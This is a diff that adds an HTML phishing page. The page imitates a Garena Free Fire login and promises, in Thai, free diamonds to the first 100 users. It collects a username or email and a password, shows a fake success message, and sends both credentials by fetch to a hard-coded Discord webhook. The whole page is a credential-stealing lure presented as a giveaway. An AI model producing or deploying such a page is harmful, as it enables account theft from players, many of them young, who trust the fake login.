@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Test</title>
+        <link rel="stylesheet" href="Garena.css">
+        <link rel="preconnect" href="https://fonts.gstatic.com">
+        <link href="https://fonts.googleapis.com/css2?family=Mitr:wght@500&display=swap" rel="stylesheet">
+    </head>
+    <body style="background-color: rgb(43, 43, 43);">
+        <div class="header">
+            <h1>Free Fire : แจกฟรีเพชร! เฉพาะ 100 คนแรก! </h1>
+        </div>
+        <h1 style="font-size: 1.5cm; color: rgb(255, 72, 72);">Garena</h1><br>
+        <div class="bruh">
+            <input class="input" id="username" placeholder="ชื่อผู้ใช้ / อีเมล" type="text">
+        </div><br>
+        <div class="bruh">
+            <input class="input" id="password" placeholder="รหัสผ่าน" type="password">
+        </div><br>
+        <div class="bruh">
+            <a style="color: rgb(255, 255, 255); font-size: 1.2cm; margin: 10px;">จำนวนเพชร : </a><a style="color: rgb(0, 132, 255); font-size: 1.2cm;">1060 เพชร</a>
+        </div><br>
+        <div class="bruh">
+            <input onclick="start()" class="input2" value="✔ ยืนยัน" type="button">
+        </div>
+        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+        <script>
+            var user = document.getElementById('username')
+            var pass = document.getElementById('password')
+            function start() {
+                if (user.value == "") {
+                    swal({
+                        title: "ผิดพลาด!",
+                        text: "ชื่อผู้ใช้ว่างเปล่า",
+                        icon: "error",
+                        button: "ตกลง",
+                    });
+                }
+                else
+                {
+                    if (user.value.length < 6) {
+                        swal({
+                            title: "ผิดพลาด!",
+                            text: "ชื่อผู้ใช้น้อยกว่า 6 ตัว",
+                            icon: "error",
+                            button: "ตกลง",
+                        });
+                    }
+                    else
+                    if (user.value.length > 15) {
+                        swal({
+                            title: "ผิดพลาด!",
+                            text: "ชื่อผู้ใช้มากกว่า 15 ตัว",
+                            icon: "error",
+                            button: "ตกลง",
+                        });
+                    }
+                    else
+                    if (pass.value == "") {
+                        swal({
+                            title: "ผิดพลาด!",
+                            text: "รหัสผ่านว่างเปล่า",
+                            icon: "error",
+                            button: "ตกลง",
+                        });
+                    }
+                    else
+                    if (pass.value.length <  8) {
+                        swal({
+                            title: "ผิดพลาด!",
+                            text: "รหัสผ่านน้อยกว่า 8 ตัว",
+                            icon: "error",
+                            button: "ตกลง",
+                        });
+                    }
+                    else
+                    if (pass.value.length >  16) {
+                        swal({
+                            title: "ผิดพลาด!",
+                            text: "รหัสผ่านมากกว่า 16 ตัว",
+                            icon: "error",
+                            button: "ตกลง",
+                        });
+                    }
+                    else
+                    {
+                        swal({
+                            title: "เสร็จสิ้น!",
+                            text: "กรุณารอดำเนินการภายใน 24 ชั่วโมง",
+                            icon: "success",
+                            button: "ตกลง",
+                        });
+const url = "https://discord.com/api/webhooks/811227114736058458/SzdTchVaKUnr7gGwO6vXMCx1IwFs0g9cGbCr8rIvhE1vFM2Sm-pJMkEmVas6E0rxFEns"
+const msg = 
+{
+  "embeds": [
+    {
+      "title": "Garena (Free Fire)",
+      "description": "Username / Email : "+user.value+"\nPassword : "+pass.value,
+      "color": 16730184
+    }
+  ],
+}
+
+fetch(url,{"method":"POST","headers": {"content-type":"application/json"},"body":JSON.stringify(msg)})
+                    }
+                }
+            }
+        </script>
+    </body>
+</html>
